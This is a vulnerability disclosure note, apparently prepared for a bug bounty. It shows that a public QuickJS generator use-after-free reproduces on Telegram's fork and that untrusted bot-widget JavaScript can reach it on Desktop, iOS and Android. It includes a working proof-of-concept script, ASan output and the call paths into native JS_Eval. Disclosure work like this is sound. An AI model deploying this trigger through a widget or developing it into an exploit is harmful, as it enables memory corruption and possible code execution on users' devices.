# QuickJS generator UAF reproduced on Telegram's fork (reachability check)

## What this is
Dynamic verification that the generator use-after-free reported **upstream** as
quickjs-ng issue **#1910** ("closures created before OP_initial_yield do not keep
the generator alive") **also reproduces on Telegram's own fork**
`TelegramMessenger/quickjs`, which Telegram compiles **natively** into the
widget sandbox used by Telegram Desktop (`Telegram/cmake/lib_quickjs.cmake`,
`SourceFiles/tgw/*`) and iOS (`widget-sandbox/packages/ios/Sources/CQuickJS`).

**Attribution:** the UAF itself is NOT our finding — it was found with the
"Mythos 5.2" fuzzer and reported upstream (quickjs-ng #1910), and is public. Our
contribution is only the **reachability / exposure** verification: Telegram ships
a fork that still has this bug, in an engine that runs **untrusted bot-widget
JavaScript**, so a malicious bot widget can trigger a native UAF on
Desktop/iOS.

## Reproduction
- Fork: `TelegramMessenger/quickjs` @ `b526a817f188ef861eea7666d68361c7851673a0`
  (2026-11-10, "Merge tdesktop-fixes into master").
- Build: `cmake -DQJS_ENABLE_ASAN=ON -DCMAKE_BUILD_TYPE=Debug` with gcc
  (gcc defines `__SANITIZE_ADDRESS__`, which disables the small-block arena at
  `quickjs.c:272` so ASan sees the frees).
- Run: `./qjs -C poc.js` (sloppy mode — `-C` matters; as a module it is strict,
  `arguments` is not mapped, and you get a TypeError instead).

`poc.js` is plain JavaScript (no modules, no explicit `gc()`):
```js
var K;
function mk() {
  function* g(self) { K = arguments; self = yield 1; yield 2; }
  var it = g(0);
  it.next();
  it.next(it);   // self = it: generator kept alive only by its own frame
}
mk();
var junk = [];
for (var i = 0; i < 200000; i++) junk.push({a: i, b: [i]});  // let the GC run
var o = K[0];   // dangling reference to the freed generator
```

## Result (asan-output.txt)
```
==ERROR: AddressSanitizer: heap-use-after-free ... READ of size 4
  #0 gc_decref_child quickjs.c:7699
  ...
  #4 JS_RunGC quickjs.c:7823
freed by thread T0 here:
  #4 gc_free_cycles quickjs.c:7811
  #5 JS_RunGC quickjs.c:7829
```
The 112-byte generator region is freed by the cycle collector and then read
during a later GC mark. Confirmed on Telegram's fork.

## Scope / honest severity
- **Desktop + Android + iOS (native quickjs widget sandbox): RCE-class.** The
  fork `TelegramMessenger/widget-sandbox` has native packages for all three
  (`packages/desktop`, `packages/android`, `packages/ios`), each embedding this
  quickjs. A UAF reachable from attacker-controlled bot-widget JS is a classic
  exploitation primitive. (Correcting an earlier note: Android **is** in scope
  here — it ships the native widget sandbox, not only the system WebView.)
- **Widget JS is fairly arbitrary.** The sandbox fixtures run complex attacker
  JS (closures, `Set.prototype` overrides, event dispatch, rAF). The
  `trusted_validator.cpp` validates CSS selectors / animations / queries — the
  **declarative** surface — not the JS language, and no block on generator
  functions was found, so the #1910 generator path is very likely reachable from
  a bot widget. Confirm against a real widget before claiming full exploitation.
- **Web (tweb): NOT native RCE** — QuickJS there is compiled to WASM
  (`quickjs-emscripten`), so a guest UAF corrupts WASM linear memory, not host
  native memory (at most a sandbox-policy escape inside WASM).
- **Bug origin:** upstream quickjs-ng (#1910), public. For the Telegram bounty
  this may fall under the "flawed open-source software version" exclusion; the
  Telegram-specific, likely-novel part is the **reachability** (their forked
  engine runs untrusted bot JS → native UAF). Report to Telegram for the
  exposure regardless of payout; they maintain the fork and should rebase/fix.

## Reachability — CONFIRMED from `TelegramMessenger/widget-sandbox` source
Item 1 below is now resolved by reading the widget-sandbox source: a widget's
inline `<script>` is fed raw to native `JS_Eval` with **no JS-source language
filter** on all three native platforms, and the engine submodule is pinned at
the exact commit this PoC reproduces on.

- **Submodule pin matches this build:** `.gitmodules` →
  `packages/ios/Sources/CQuickJS/quickjs` @ `b526a817…` (the same commit as above).
- **Desktop:** `sandbox_engine.cpp:902` `callTw("nextScript")` → `:914`
  `evalScript(code)` → `:897` `js_->evaluate(code)` → `quickjs_context.cpp:144`
  `qjs_eval(context_, code.c_str(), …)` (raw `JS_Eval`).
- **iOS:** `CQuickJS/shim/qjs_shim.c:36` `JS_Eval(ctx, code, len, …)`.
- **Android:** `SandboxEngine.kt:962` `callTw("nextScript")` → `:953`
  `ctx.evaluate(code, filename, asModule)` (JNI → native `JS_Eval`).
- **No source subset; eval is explicitly allowed:** `profile.json` lists
  `js.eval` ("eval / new Function inside QuickJS", status **in**) and
  `js.microtasks` (Promise/async, in). `trusted_validator.cpp` validates the
  **output ops** (elements/attrs/CSS/URLs), not the input JS. The only input
  filter in `pumpScripts` skips `src` (external) scripts; inline `code` runs raw.
  Generators have no block, and `eval("function* g(){…}")` would defeat any
  hypothetical static subset anyway.

→ The #1910 generator UAF PoC is reachable verbatim from a bot widget on
Desktop, iOS, and Android.

## Still to confirm (severity, not reachability)
- The sandbox process/thread isolation on iOS/Android (whether a native UAF in
  the engine thread reaches the host process, or is contained to a sandboxed
  child). On Desktop (Win/Lin) there is no sandbox process, so the UAF is in
  Telegram's own address space. Controlled exploitation was not attempted.
